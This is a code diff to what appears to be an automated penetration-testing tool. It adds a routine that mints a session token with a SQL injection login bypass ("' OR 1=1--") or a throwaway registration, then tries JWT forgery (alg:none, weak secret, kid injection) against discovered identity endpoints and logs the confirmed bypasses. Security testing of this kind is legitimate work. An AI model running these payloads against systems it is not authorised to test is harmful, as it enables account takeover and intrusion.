@@ -352,11 +352,109 @@ async def run_generalized_massassign(
     return persisted, len(candidates)
 
 
+async def run_generalized_jwt(
+    engagement_id: str, graph_memory: Any, *, per_check_timeout: float = 30.0
+) -> Tuple[List[Vulnerability], int]:
+    """Drive real JWT forgery (alg:none / weak-secret / kid-injection) off
+    recon-discovered endpoints. Needs a login endpoint (to mint a base token) and
+    an identity-reflecting endpoint (to confirm a forged identity is accepted).
+    Token acquisition: SQLi auth-bypass first, else register+login (juice-shop
+    pattern via the reused Target helpers)."""
+    import uuid as _uuid
+    from urllib.parse import urlparse
+
+    import httpx
+
+    from ai_osop.core.jwt_tester import JWTTester
+
+    bench = _load_suite()
+    eps = await _discovered_endpoints(graph_memory, engagement_id)
+
+    base = None
+    login_url = None
+    identity_url = None
+    for ep in eps:
+        url = ep.get("url")
+        if not url:
+            continue
+        if base is None:
+            u = urlparse(url)
+            base = f"{u.scheme}://{u.netloc}"
+        path = (ep.get("path") or "").lower()
+        method = (ep.get("method") or "GET").upper()
+        if login_url is None and "login" in path and (method == "POST" or ep.get("has_body")):
+            login_url = url
+        if identity_url is None and any(
+            s in path for s in ("whoami", "/me", "userinfo", "currentuser", "profile", "account")
+        ):
+            identity_url = url
+    if not (login_url and identity_url and base):
+        return [], 0
+
+    persisted: List[Vulnerability] = []
+    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
+        t = bench.Target(base, c)
+        token = None
+        try:
+            token = await t.login("' OR 1=1--", "x")  # SQLi bypass mints a token cheaply
+        except Exception:
+            token = None
+        if not token:
+            try:
+                email = f"osop-jwt-{_uuid.uuid4().hex[:10]}@recon.test"
+                await t.register(email, "OSOPjwt1!")
+                token = await t.login(email, "OSOPjwt1!")
+            except Exception:
+                token = None
+        if not token:
+            return [], 0
+        try:
+            tester = JWTTester(verify_url=identity_url, base_token=token, method="GET", timeout=15.0)
+            findings = await asyncio.wait_for(tester.run(), timeout=per_check_timeout)
+        except Exception:
+            return [], 0
+        for f in [x for x in findings if getattr(x, "confirmed", False)]:
+            vuln = Vulnerability(
+                cwe="CWE-347",
+                vuln_type=VulnClass.JWT_ABUSE,
+                severity=Severity.CRITICAL,
+                title=f"JWT authentication bypass ({f.technique}) at {identity_url}",
+                description=(
+                    f"{getattr(f, 'detail', '')} Confirmed at {identity_url} — driven off "
+                    f"recon-discovered login/identity endpoints."
+                ),
+                evidence=[
+                    {
+                        "type": "jwt_forgery",
+                        "provenance": "jwt_tester",
+                        "discovered": True,
+                        "technique": f.technique,
+                        "verify_url": identity_url,
+                        "detail": getattr(f, "detail", "")[:200],
+                    }
+                ],
+                tool_source="deterministic_scan_generalized",
+                confidence=0.95,
+                validated=True,
+                exploitability="high",
+                impact="high",
+                engagement_id=engagement_id,
+            )
+            try:
+                await graph_memory.add_vulnerability(vuln)
+                persisted.append(vuln)
+            except Exception:
+                pass
+    return persisted, 1
+
+
 async def run_generalized_scan(
     engagement_id: str, graph_memory: Any
 ) -> Tuple[List[Vulnerability], int]:
     """Combined generalized pass over recon-discovered endpoints: SQLi + mass
-    assignment. The single seam other classes (JWT, IDOR) plug into next."""
+    assignment + JWT forgery. IDOR (needs two authenticated sessions) is the next
+    class to plug into this seam."""
     sqli, examined = await run_generalized_sqli(engagement_id, graph_memory)
     ma, _ = await run_generalized_massassign(engagement_id, graph_memory)
-    return sqli + ma, examined
+    jwt, _ = await run_generalized_jwt(engagement_id, graph_memory)
+    return sqli + ma + jwt, examined
